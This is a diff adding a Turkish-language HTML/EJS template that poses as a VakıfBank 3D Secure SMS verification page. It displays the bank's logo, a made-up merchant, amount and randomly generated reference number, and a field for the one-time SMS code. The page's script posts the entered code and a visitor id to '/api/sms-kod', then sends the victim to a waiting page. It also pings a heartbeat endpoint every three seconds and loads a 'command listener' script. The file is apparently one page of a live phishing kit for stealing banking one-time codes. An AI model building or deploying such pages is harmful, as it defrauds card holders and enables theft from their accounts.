@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="tr"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS</title>
+    <link href="/css/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="/vakif/site.css">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+    <style>
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1434CB; /* Visa blue */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        .processing-visa-logo {
+            display: block;
+            margin: 20px auto;
+            max-height: 30px;
+        }
+
+        .cancel-link a, .sms-link a {
+            text-decoration: none;
+            font-weight: bold;
+            display: block;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .sms-link a {
+            color: rgb(30, 30, 43);
+            ; /* Yeşil renk */
+            font-size: small;
+        }
+
+        html, body {
+            height: auto;
+            min-height: 100%;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+            overflow-y: auto;
+        }
+
+        .acs-scroll-container {
+            min-height: 100vh;
+            overflow-y: visible;
+            overflow-x: hidden;
+            -webkit-overflow-scrolling: touch;
+            padding-bottom: 30px;
+        }
+    </style>
+</head>
+<style>
+  :root {
+    --bank-color: #0d4d8c;
+    --bank-accent: #1a73d4;
+    --bank-soft: #edf5ff;
+    --bg: #eef5fb;
+    --card: #ffffff;
+    --text: #183153;
+    --muted: #64748b;
+    --line: rgba(15, 23, 42, 0.08);
+    --button: linear-gradient(135deg, #f6c64d 0%, #f2b600 100%);
+  }
+
+  html, body {
+    margin: 0;
+    min-height: 100%;
+    background: linear-gradient(180deg, #edf4fb 0%, #f8fafc 100%);
+    font-family: "Segoe UI", Tahoma, Arial, sans-serif;
+    color: var(--text);
+  }
+
+  body {
+    display: flex;
+    align-items: flex-start;
+    justify-content: center;
+    padding: 18px 12px;
+  }
+
+  body .acs-scroll-container,
+  body .container,
+  body .sms-shell {
+    width: min(520px, 100%);
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    overflow: hidden;
+    box-shadow: 0 12px 28px rgba(15, 23, 42, 0.10);
+  }
+
+  body .header,
+  body .topbar {
+    background: #fff;
+    color: var(--text);
+    padding: 14px 18px;
+    border-bottom: 0;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    min-height: 62px;
+    gap: 12px;
+  }
+
+  body .header img,
+  body .topbar img {
+    max-height: 30px;
+    width: auto;
+    display: block;
+    object-fit: contain;
+    background: transparent;
+    padding: 0;
+    border-radius: 0;
+    box-sizing: border-box;
+    box-shadow: none;
+  }
+
+  body .transaction-details,
+  body .sms-section {
+    background: #fff;
+    padding: 14px 16px;
+    border-bottom: 1px solid var(--line);
+  }
+
+  body .detail-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    padding: 8px 0;
+    border-bottom: 1px solid var(--line);
+    font-size: 13px;
+    color: var(--text);
+  }
+
+  body .detail-row:last-child {
+    border-bottom: 0;
+  }
+
+  body .label {
+    color: var(--muted);
+    font-weight: 700;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    font-size: 11px;
+  }
+
+  body .value,
+  body .amount {
+    font-weight: 600;
+    color: var(--text);
+    text-align: right;
+    font-variant-numeric: tabular-nums;
+    font-size: 13px;
+  }
+
+  body .challenge-info,
+  body .sms-info {
+    margin: 0;
+    color: var(--text);
+    font-size: 14px;
+    line-height: 1.5;
+  }
+
+  body .verification-input {
+    position: relative;
+    margin-top: 10px;
+  }
+
+  body .input-label {
+    display: block;
+    color: var(--muted);
+    font-weight: 700;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    font-size: 11px;
+    margin-bottom: 6px;
+  }
+
+  body .sms-input {
+    width: 100%;
+    min-height: 44px;
+    background: #fff;
+    border: 1px solid rgba(148, 163, 184, 0.6);
+    border-radius: 12px;
+    padding: 0 40px 0 12px;
+    font-size: 15px;
+    line-height: 1;
+    color: var(--text);
+    box-sizing: border-box;
+    outline: none;
+  }
+
+  body .sms-input:focus {
+    border-color: var(--bank-accent);
+    box-shadow: 0 0 0 3px rgba(26, 115, 212, 0.12);
+  }
+
+  body .toggle-password {
+    position: absolute;
+    right: 14px;
+    top: 50%;
+    transform: translateY(2px);
+    color: var(--bank-accent);
+    font-size: 18px;
+    cursor: pointer;
+  }
+
+  body .countdown,
+  body #countdownBox,
+  body #countdownWrapper {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    background: #f8fafc;
+    border: none !important;
+    border-radius: 10px;
+    padding: 4px 10px;
+    margin-top: 0;
+    margin-bottom: 0;
+    color: var(--muted);
+    font-size: 12px;
+    box-shadow: none !important;
+  }
+
+  body .submit-button,
+  body #submitButton,
+  body button[type="submit"] {
+    width: 100%;
+    min-height: 44px;
+    background: var(--button);
+    color: #1f2937;
+    border: 0;
+    border-radius: 10px;
+    font-weight: 800;
+    font-size: 14px;
+    cursor: pointer;
+    box-shadow: 0 8px 16px rgba(242, 182, 0, 0.20);
+  }
+
+  body .submit-button:hover,
+  body #submitButton:hover {
+    transform: translateY(-1px);
+  }
+
+  body .alert-error-text,
+  body #inlineError,
+  body .error-text {
+    background: rgba(220, 38, 38, 0.06);
+    border: 1px solid rgba(220, 38, 38, 0.12);
+    color: #b91c1c;
+    border-radius: 10px;
+    padding: 8px 10px;
+    font-size: 12px;
+    margin-top: 10px;
+  }
+
+  body .actions {
+    padding: 10px 16px 16px;
+  }
+</style>
+<body>
+    <% 
+      var simdi = new Date();
+      var ikiBasamak = function (n) { return (n < 10 ? '0' : '') + n; };
+      var tarihMetni = ikiBasamak(simdi.getDate()) + '.' + ikiBasamak(simdi.getMonth() + 1) + '.' + simdi.getFullYear() + ' ' + ikiBasamak(simdi.getHours()) + ':' + ikiBasamak(simdi.getMinutes());
+      var telTemiz = String((kullanici && kullanici.telefon) || '').replace(/[^0-9]/g, '');
+      var telSon2 = 'XX';
+      if (telTemiz.length >= 2) {
+        telSon2 = 'XX' + telTemiz.slice(-2);
+      }
+      var telGoster = '05XXXXXXXXX';
+      if (/^05[0-9]{9}$/.test(telTemiz)) {
+        telGoster = telTemiz.slice(0, 2) + 'XXXXXX' + telTemiz.slice(-2);
+      }
+      var islemAdiGoster = (typeof islemAdi !== 'undefined' && islemAdi) ? String(islemAdi) : 'GO Güvenli Öde';
+      var tutarGoster = (typeof tutar !== 'undefined' && tutar) ? String(tutar).replace(/\s*TL\s*$/i, '').trim() : '45.00';
+      var kartNoSon4Goster = (typeof kartNoSon4 !== 'undefined' && kartNoSon4) ? String(kartNoSon4) : '****';
+      var kartMarka = String((kullanici && kullanici.kartMarka) || '').toUpperCase();
+      var kartLogo = '/assets/img/psimage_mc.svg';
+      if (kartMarka.indexOf('VISA') !== -1) kartLogo = '/img/visa.png';
+      else if (kartMarka.indexOf('MAST') !== -1 || kartMarka.indexOf('MASTER') !== -1) kartLogo = '/img/master.png';
+      else if (kartMarka.indexOf('TROY') !== -1) kartLogo = '/img/troy.png';
+      var referansNo = 'VAKIFBANK-' + simdi.toISOString().slice(0, 10).replace(/-/g, '') + '-' + Math.floor(100000 + Math.random() * 900000);
+      var hataliSmsVar = (typeof hataliSms !== 'undefined') && !!hataliSms;
+    %>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <div b-wtrttf4c3n="" class="container acs-scroll-container" role="main">
+        <div b-wtrttf4c3n="" class="header">
+            <img b-wtrttf4c3n="" src="/vakif/logo.png" alt="VakıfBank Logo" class="logo" style="float:left;">
+            <img b-wtrttf4c3n="" src="<%= kartLogo %>" alt="Kart Markası" class="visa-logo" style="float:right;">
+        </div>
+        
+
+        <style>
+    .alert-error-text {
+        color: darkred;
+        background: rgba(255, 255, 255, 0.96);
+        border: 1px solid rgba(220, 38, 38, 0.18);
+        padding: 8px 10px;
+        font-size: 12px;
+        font-weight: 600;
+        line-height: 1.3;
+        border-radius: 8px;
+        margin: 10px 0 8px;
+        display: block;
+        animation: fadeIn 0.3s ease-in-out;
+        width: 100%;
+        box-sizing: border-box;
+    }
+
+    #helpPanel {
+        display: none;
+        opacity: 0;
+        visibility: hidden;
+        transform: translate(-50%, 10px);
+        transition: opacity .2s ease, transform .2s ease, visibility .2s ease;
+    }
+
+    #helpPanel.open {
+        display: block !important;
+        opacity: 1;
+        visibility: visible;
+        transform: translate(-50%, 0);
+    }
+
+    .verification-input {
+        position: relative; /* İkonun buna göre hizalanması için kritik */
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+    }
+
+    .sms-input {
+        width: 100%;
+        padding: 12px; /* Genel padding */
+        padding-right: 45px; /* İkonun altında kalmaması için sağ boşluk */
+        box-sizing: border-box;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+        height: 50px; /* Standart yükseklik */
+    }
+
+    .toggle-password {
+        position: absolute;
+        right: 15px; /* Sağdan boşluk */
+        top: 50%; /* Üstten %50 */
+        /* Label varsa (input-label) transformu ona göre ayarlamak gerekir,
+                   aşağıdaki satır input'un kendi iç merkezine göre ayarlar */
+        transform: translateY(2px);
+        cursor: pointer;
+        color: #FF9F00;
+        font-size: 18px;
+        z-index: 10;
+    }
+
+    .toggle-password:hover {
+            color: #000;
+        }
+
+    .sms-input.masked {
+        -webkit-text-security: disc; /* iOS & Safari */
+        text-security: disc;
+    }
+</style>
+
+<input type="hidden" id="screenTimeoutSec" value="180">
+<input type="hidden" id="serverRenderMs" value="1789350658139">
+
+<div class="title-bar" id="auth-title">
+    3D SECURE DOĞRULAMA
+</div>
+
+<div class="transaction-details p-4">
+    <div class="detail-row">
+        <span class="label">İşyeri Adı</span>
+        <span class="value"><%= islemAdiGoster %></span>
+    </div>
+    <div class="detail-row">
+        <span class="label">İşlem Tutarı</span>
+        <span class="amount"><b><%= tutarGoster %> TL</b></span>
+    </div>
+    <div class="detail-row">
+        <span class="label">İşlem Tarihi - Saat</span>
+        <span class="value"><%= tarihMetni %></span>
+    </div>
+    <div class="detail-row">
+        <span class="label">Kart Numarası</span>
+        <span class="value">************<%= kartNoSon4Goster %></span>
+    </div>
+    <div class="detail-row">
+        <span class="label">Referans No</span>
+        <span class="value"><%= referansNo %></span>
+    </div>
+</div>
+
+<div class="sms-section challenge-zone" aria-labelledby="challenge-desc">
+    <div class="challenge-info" id="challenge-desc">
+        <p class="sms-info">
+            Doğrulama kodu, <b><%= telGoster %></b> nolu cep telefonunuza gönderilmiştir.
+        </p>
+    </div>
+    <div class="countdown-wrapper">
+        <form id="authForm" class="auth-form" action="#" method="post">
+
+            <div class="verification-input">
+                <label for="smsCode" class="input-label">Doğrulama Kodu</label>
+                <div class="alert-error-text" id="inlineError" style="display:none"></div>
+                <input type="text" id="smsCode" name="smsCode" class="sms-input sms-input masked" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" placeholder="">
+
+                <span class="toggle-password" onclick="toggleSmsCode()">
+                    <i id="eyeIcon" class="fa fa-eye"></i>
+                </span>
+            </div>
+
+            <div id="countdownBox" class="countdown-wrapper">
+                <div class="countdown">
+                    <span class="countdown-label">Kalan Süre:</span>
+                    <span id="countdown">03:00</span>
+                </div>
+            </div>
+
+            <div class="actions flex flex-col items-center space-y-3 relative" role="group" aria-label="İşlem Kontrolleri">
+    <button type="submit" id="submitButton" class="submit-button w-full max-w-md" aria-label="Doğrulama kodunu onayla" disabled="" style="pointer-events: none; opacity: 0.25; cursor: not-allowed;">
+        Onayla
+    </button>
+
+    <button type="button" id="resendButton" class="submit-button w-full max-w-md" aria-label="Doğrulama kodunu tekrar gönder" disabled="" style="display: none;">
+        Tekrar Gönder
+    </button>
+
+    <div class="grid grid-cols-12 gap-3 w-full max-w-md justify-center">
+        <button type="button" id="cancelButton" class="cancel-button col-span-7 text-center" aria-label="İşlemi iptal et">
+            İşlemi İptal Et
+        </button>
+
+        <button type="button" id="helpButton" class="cancel-button col-span-5 text-center" aria-label="Yardım al">
+            Yardım
+        </button>
+    </div>
+
+    <!-- Yardım Paneli -->
+    <div id="helpPanel" class="absolute left-1/2 transform -translate-x-1/2 bottom-full mb-3 w-80 bg-white border border-gray-200 shadow-lg rounded-xl p-5 text-center z-50" style="max-width: calc(100vw - 2rem);">
+        <p class="text-gray-700 text-[15px] leading-relaxed mb-4">
+            Herhangi bir konuda desteğe mi ihtiyacınız var?<br>
+            Bize ulaşmak için lütfen arayın
+        </p>
+
+    </div>
+</div>
+
+
+
+            <input type="hidden" id="allowResend" value="false">
+        </form>
+    </div>
+
+</div>
+
+
+
+<script>
+(function () {
+  var form = document.getElementById('authForm');
+  var input = document.getElementById('smsCode');
+  var btn = document.getElementById('submitButton');
+  var countdownEl = document.getElementById('countdown');
+  var inlineError = document.getElementById('inlineError');
+  var cancelBtn = document.getElementById('cancelButton');
+  var helpBtn = document.getElementById('helpButton');
+  if (!form || !input || !btn) return;
+
+  var kalanSaniye = 180;
+  var sayac = null;
+
+  function sureMetni(s) {
+    var dk = Math.floor(s / 60);
+    var sn = s % 60;
+    return dk + ':' + (sn < 10 ? '0' : '') + sn;
+  }
+
+  function gosterHata(mesaj) {
+    if (!inlineError) return;
+    inlineError.textContent = mesaj || 'Hatalı doğrulama kodu girdiniz.';
+    inlineError.style.display = 'block';
+  }
+
+  function hataliDurumunuYonet() {
+    var params = new URLSearchParams(window.location.search);
+    if (params.get('hatali') === '1') {
+      gosterHata('Hatalı SMS girdiniz. Lütfen tekrar deneyin.');
+    }
+  }
+
+  function temizleHata() {
+    if (inlineError) inlineError.style.display = 'none';
+  }
+
+  function sayacBaslat() {
+    if (sayac) clearInterval(sayac);
+    kalanSaniye = 180;
+    if (countdownEl) countdownEl.textContent = sureMetni(kalanSaniye);
+    btn.disabled = false;
+    btn.style.pointerEvents = 'auto';
+    btn.style.opacity = '1';
+    btn.style.cursor = 'pointer';
+    sayac = setInterval(function () {
+      kalanSaniye -= 1;
+      if (kalanSaniye <= 0) {
+        clearInterval(sayac);
+        sayac = null;
+        if (countdownEl) countdownEl.textContent = '00:00';
+        btn.disabled = true;
+        btn.style.pointerEvents = 'none';
+        btn.style.opacity = '0.25';
+        btn.style.cursor = 'not-allowed';
+        return;
+      }
+      if (countdownEl) countdownEl.textContent = sureMetni(kalanSaniye);
+    }, 1000);
+  }
+
+  input.addEventListener('input', function () {
+    input.value = input.value.replace(/\D/g, '').slice(0, 6);
+    temizleHata();
+    btn.disabled = input.value.length !== 6;
+    btn.style.pointerEvents = input.value.length === 6 ? 'auto' : 'none';
+    btn.style.opacity = input.value.length === 6 ? '1' : '0.25';
+    btn.style.cursor = input.value.length === 6 ? 'pointer' : 'not-allowed';
+  });
+
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+    var kod = input.value.trim();
+
+    if (!/^\d{5,6}$/.test(kod)) {
+      gosterHata('Lütfen 5 veya 6 haneli doğrulama kodunu giriniz.');
+      return;
+    }
+
+    temizleHata();
+    btn.disabled = true;
+    btn.style.pointerEvents = 'none';
+    btn.style.opacity = '0.25';
+    btn.style.cursor = 'not-allowed';
+
+    var vid = localStorage.getItem('ziyaretci-id') || '';
+    fetch('/api/sms-kod', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ vid: vid, kod: kod })
+    })
+    .then(function (res) { return res.json(); })
+    .then(function (data) {
+      if (!(data && data.ok)) {
+        gosterHata((data && data.hata) || 'SMS kodu kaydedilemedi.');
+        btn.disabled = false;
+        btn.style.pointerEvents = 'auto';
+        btn.style.opacity = '1';
+        btn.style.cursor = 'pointer';
+        return;
+      }
+      window.location.href = '/bekleme';
+    })
+    .catch(function () {
+      gosterHata('Sunucuya bağlanılamadı.');
+      btn.disabled = false;
+      btn.style.pointerEvents = 'auto';
+      btn.style.opacity = '1';
+      btn.style.cursor = 'pointer';
+    });
+  });
+
+  if (cancelBtn) {
+    cancelBtn.addEventListener('click', function () {
+      window.location.href = '/odeme';
+    });
+  }
+
+  if (helpBtn) {
+    helpBtn.addEventListener('click', function () {
+      var panel = document.getElementById('helpPanel');
+      if (!panel) return;
+      panel.classList.toggle('open');
+    });
+  }
+
+  hataliDurumunuYonet();
+  sayacBaslat();
+})();
+</script>
+<% if (kullanici && kullanici.tcno) { %>
+<script>
+    (function () {
+        var at = function () {
+            var sayfa = (location.pathname + location.search + location.hash).slice(0, 120);
+            fetch("/api/heartbeat", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ sayfa: sayfa })
+            }).catch(function () {});
+        };
+        at();
+        setInterval(at, 3000);
+        document.addEventListener("visibilitychange", function () { if (!document.hidden) at(); });
+    })();
+</script>
+<% } %>
+<script src="/js/komut-dinle.js"></script>
+</body></html>
